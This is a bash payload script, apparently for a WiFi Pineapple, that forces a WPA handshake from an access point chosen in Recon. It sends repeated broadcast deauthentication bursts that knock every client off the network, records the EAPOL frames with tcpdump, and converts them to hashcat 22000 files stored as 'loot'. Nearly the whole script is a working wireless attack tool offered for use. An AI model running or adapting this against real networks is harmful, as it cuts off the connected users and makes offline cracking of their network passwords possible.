#!/bin/bash
# Title: Handshaker
# Description: Force a handshake for the Recon-selected AP on wlan1mon. Parks the radio with PINEAPPLE_EXAMINE_CHANNEL <ch> 0 until RESET. Press B to stop.
# Version: 1.3
# Category: recon/access_point

HANDSHAKE_DIR="/root/loot/handshakes"
LISTEN_IFACE="wlan1mon"
DEAUTH_BURST=12
LISTEN_WINDOW_SEC=15
INPUT=/dev/input/event0
RUN_FLAG="/tmp/handshaker.run"
EXAMINE_STARTED=0
TCPDUMP_PID=""
LISTEN_PCAP=""
USER_STOP=0
HANDSHAKE=""

TARGET_SSID="${_RECON_SELECTED_AP_SSID:-}"
TARGET_BSSID="${_RECON_SELECTED_AP_BSSID:-}"
TARGET_CHANNEL="${_RECON_SELECTED_AP_CHANNEL:-}"
TARGET_CHANNEL="${TARGET_CHANNEL%% *}"

cleanup() {
    rm -f "$RUN_FLAG"
    if [ -n "$TCPDUMP_PID" ]; then
        kill "$TCPDUMP_PID" 2>/dev/null || true
        wait "$TCPDUMP_PID" 2>/dev/null || true
        TCPDUMP_PID=""
    fi
    if [ "$EXAMINE_STARTED" = "1" ]; then
        LOG blue "Resuming channel hopping.."
        PINEAPPLE_EXAMINE_RESET
        EXAMINE_STARTED=0
    fi
}
trap cleanup EXIT INT TERM

iface_available() {
    local iface="$1"
    [ -d "/sys/class/net/${iface}" ] && return 0
    iw dev "$iface" info >/dev/null 2>&1
}

looks_like_mac() {
    echo "$1" | grep -Eqi '^([0-9a-f]{2}:){5}[0-9a-f]{2}$'
}

clean_bssid() {
    printf "%s" "$1" | tr -d '[:space:]:-' | tr '[:lower:]' '[:upper:]'
}

flush_buttons() {
    [ -e "$INPUT" ] || return 0
    dd if="$INPUT" of=/dev/null bs=16 count=200 iflag=nonblock 2>/dev/null || true
}

# Non-blocking hardware button via /dev/input/event0 (SKILL attack-loop / fenris).
evdev_stop_pressed() {
    local data evtype evvalue
    [ -e "$INPUT" ] || return 1
    data=$(timeout 0.1 dd if="$INPUT" bs=16 count=1 2>/dev/null | hexdump -e '16/1 "%02x "' 2>/dev/null)
    [ -z "$data" ] && return 1
    evtype=$(echo "$data" | cut -d' ' -f9-10)
    evvalue=$(echo "$data" | cut -d' ' -f13)
    [ "$evtype" = "01 00" ] && [ "$evvalue" = "01" ]
}

# Returns 0 if a key-down was seen, 1 if ~1s elapsed with no press.
wait_one_second() {
    local i=0
    while [ "$i" -lt 10 ]; do
        if evdev_stop_pressed; then
            return 0
        fi
        i=$((i + 1))
    done
    return 1
}

find_handshake() {
    local mac_plain mac_lower hit
    mac_plain=$(clean_bssid "$TARGET_BSSID")
    [ -z "$mac_plain" ] && return 1
    mac_lower=$(printf "%s" "$mac_plain" | tr '[:upper:]' '[:lower:]')

    mkdir -p "$HANDSHAKE_DIR"

    hit=$(find "$HANDSHAKE_DIR" -type f \( \
        -iname "*${mac_plain}*.22000" -o \
        -iname "*${mac_lower}*.22000" \
    \) 2>/dev/null | head -n 1)
    if [ -n "$hit" ]; then
        printf "%s" "$hit"
        return 0
    fi

    hit=$(find "$HANDSHAKE_DIR" -type f \( \
        -iname "*${mac_plain}*_handshake*.pcap" -o \
        -iname "*${mac_lower}*_handshake*.pcap" -o \
        -iname "*${mac_plain}*_handshake*.pcapng" -o \
        -iname "*${mac_lower}*_handshake*.pcapng" \
    \) 2>/dev/null | head -n 1)
    if [ -n "$hit" ]; then
        printf "%s" "$hit"
        return 0
    fi

    return 1
}

eapol_count_in_pcap() {
    local pcap="$1"
    [ -n "$pcap" ] && [ -f "$pcap" ] || { echo 0; return; }
    tcpdump -nn -r "$pcap" ether proto 0x888e 2>/dev/null | wc -l | tr -d ' '
}

convert_listen_pcap() {
    local out mac_plain
    [ -n "$LISTEN_PCAP" ] && [ -f "$LISTEN_PCAP" ] || return 1
    mac_plain=$(clean_bssid "$TARGET_BSSID")
    out="${HANDSHAKE_DIR}/${mac_plain}_handshaker.22000"
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        hcxpcapngtool -o "$out" "$LISTEN_PCAP" >/dev/null 2>&1 || true
        [ -s "$out" ] && printf "%s" "$out" && return 0
    fi
    return 1
}

# Burst deauth via PineAP inject on wlan1mon, then caller waits so the client can reconnect.
deauth_target() {
    local i=0
    if type PINEAPPLE_DEAUTH_CLIENT >/dev/null 2>&1; then
        while [ "$i" -lt "$DEAUTH_BURST" ]; do
            PINEAPPLE_DEAUTH_CLIENT "$TARGET_BSSID" "FF:FF:FF:FF:FF:FF" "$TARGET_CHANNEL"
            i=$((i + 1))
            sleep 0.05
        done
        return 0
    fi
    _pineap DEAUTH "$TARGET_BSSID" "FF:FF:FF:FF:FF:FF" "$TARGET_CHANNEL"
}

start_listener() {
    local mac_plain
    mac_plain=$(clean_bssid "$TARGET_BSSID")
    LISTEN_PCAP="${HANDSHAKE_DIR}/${mac_plain}_hsk_listen.pcap"
    mkdir -p "$HANDSHAKE_DIR"
    : > "$LISTEN_PCAP"
    tcpdump -i "$LISTEN_IFACE" -U -s 0 -w "$LISTEN_PCAP" \
        "(ether proto 0x888e) or (wlan addr1 $TARGET_BSSID) or (wlan addr2 $TARGET_BSSID) or (wlan addr3 $TARGET_BSSID)" \
        >/dev/null 2>&1 &
    TCPDUMP_PID=$!
    sleep 0.3
    if ! kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        tcpdump -i "$LISTEN_IFACE" -U -s 0 -w "$LISTEN_PCAP" \
            "ether proto 0x888e or type mgt subtype beacon" >/dev/null 2>&1 &
        TCPDUMP_PID=$!
        sleep 0.3
    fi
    if ! kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        TCPDUMP_PID=""
        LOG yellow "tcpdump listener failed on $LISTEN_IFACE; relying on PineAP loot."
        return 1
    fi
    LOG green "Listening for EAPOL on $LISTEN_IFACE"
    return 0
}

wait_listen_window() {
    local elapsed=0 eapol converted extra
    while [ "$elapsed" -lt "$LISTEN_WINDOW_SEC" ]; do
        if wait_one_second; then
            USER_STOP=1
            return 1
        fi
        HANDSHAKE=$(find_handshake || true)
        if [ -n "$HANDSHAKE" ]; then
            return 0
        fi
        eapol=$(eapol_count_in_pcap "$LISTEN_PCAP")
        if [ "${eapol:-0}" -ge 2 ] 2>/dev/null; then
            LOG green "EAPOL seen ($eapol frames). Collecting remainder.."
            extra=0
            while [ "$extra" -lt 3 ]; do
                if wait_one_second; then
                    USER_STOP=1
                    break
                fi
                extra=$((extra + 1))
            done
            converted=$(convert_listen_pcap || true)
            HANDSHAKE=$(find_handshake || true)
            [ -z "$HANDSHAKE" ] && HANDSHAKE="$converted"
            [ -z "$HANDSHAKE" ] && HANDSHAKE="$LISTEN_PCAP"
            [ "$USER_STOP" = "1" ] && [ -z "$HANDSHAKE" ] && return 1
            return 0
        fi
        elapsed=$((elapsed + 1))
    done
    HANDSHAKE=$(find_handshake || true)
    [ -n "$HANDSHAKE" ] && return 0
    return 1
}

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
    ERROR_DIALOG "No Recon AP selected" "Select an access point in Recon, then run Handshaker."
    LOG red "Missing Recon AP BSSID or channel. Exiting."
    exit 1
fi

if ! looks_like_mac "$TARGET_BSSID"; then
    ERROR_DIALOG "Invalid Recon BSSID" "Handshaker needs a valid AP MAC from Recon."
    LOG red "Invalid BSSID: $TARGET_BSSID"
    exit 1
fi

if ! echo "$TARGET_CHANNEL" | grep -Eq '^[0-9]+$'; then
    ERROR_DIALOG "Invalid Recon channel" "Handshaker needs a numeric channel from Recon."
    LOG red "Invalid channel: $TARGET_CHANNEL"
    exit 1
fi

if [ -z "$TARGET_SSID" ] || [ "$TARGET_SSID" = "(hidden)" ]; then
    TARGET_SSID="(hidden)"
fi

if ! iface_available "$LISTEN_IFACE"; then
    ERROR_DIALOG "wlan1mon missing" "Start PineAP/Recon and retry."
    LOG red "$LISTEN_IFACE is not available."
    exit 1
fi

LOG blue "Target SSID: $TARGET_SSID"
LOG blue "Target BSSID: $TARGET_BSSID"
LOG blue "Target channel: $TARGET_CHANNEL"
LOG green "Radio: $LISTEN_IFACE (listen + deauth)"
LOG white "Press B to stop."

HANDSHAKE=$(find_handshake || true)
if [ -n "$HANDSHAKE" ]; then
    LOG green "Handshake already present."
    ALERT "Handshake found\n\nSSID: $TARGET_SSID\nBSSID: $TARGET_BSSID\nFile: $HANDSHAKE"
    exit 0
fi

touch "$RUN_FLAG"

LOG blue "Parking $LISTEN_IFACE on channel $TARGET_CHANNEL (EXAMINE 0).."
PINEAPPLE_EXAMINE_CHANNEL "$TARGET_CHANNEL" 0
EXAMINE_STARTED=1
sleep 1
start_listener
LOG green "wlan1mon parked. Burst deauth, then quiet listen."

flush_buttons
ATTEMPT=1
while [ -f "$RUN_FLAG" ]; do
    if evdev_stop_pressed; then
        USER_STOP=1
        break
    fi
    LOG red "Deauth $ATTEMPT on $TARGET_SSID via $LISTEN_IFACE"
    deauth_target
    LOG blue "Quiet listen on $LISTEN_IFACE — press B to stop"
    if wait_listen_window; then
        break
    fi
    if [ "$USER_STOP" = "1" ]; then
        break
    fi
    ATTEMPT=$((ATTEMPT + 1))
done

if [ -z "$HANDSHAKE" ]; then
    HANDSHAKE=$(find_handshake || true)
fi
if [ -z "$HANDSHAKE" ]; then
    converted=$(convert_listen_pcap || true)
    HANDSHAKE="$converted"
fi

if [ -n "$HANDSHAKE" ]; then
    LOG green "Handshake found!"
    LOG green "$HANDSHAKE"
    ALERT "Handshake captured\n\nSSID: $TARGET_SSID\nBSSID: $TARGET_BSSID\nRadio: $LISTEN_IFACE\nFile: $HANDSHAKE"
    exit 0
fi

if [ "$USER_STOP" = "1" ]; then
    LOG yellow "Stopped by user."
    ALERT "Handshaker stopped\n\nSSID: $TARGET_SSID\nNo new handshake."
    exit 0
fi

LOG red "Stopped without a handshake file."
ALERT "Handshaker stopped\n\nSSID: $TARGET_SSID\nNo handshake captured."
exit 0
